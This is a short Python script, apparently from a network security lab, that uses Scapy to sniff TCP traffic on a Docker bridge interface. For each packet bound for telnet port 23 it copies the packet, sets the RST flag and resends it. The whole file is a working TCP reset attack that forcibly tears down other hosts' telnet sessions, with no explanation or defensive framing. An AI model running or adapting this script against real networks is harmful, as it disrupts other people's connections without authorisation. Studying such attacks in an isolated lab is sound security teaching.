#!/usr/bin/env python3
from scapy.all import *
oldid = 0
def spoof_pkt(pkt):
    global oldid
    if pkt[IP].dport == 23 and pkt[IP].id != oldid :
        newpkt = IP(bytes(pkt[IP]))
        newpkt.show()
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        oldid = pkt[IP].id
        newpkt[TCP].flags = 'R'
        send(newpkt)
f = 'tcp'
pkt = sniff(iface='br-e7e8aab5b63e', filter=f, prn=spoof_pkt)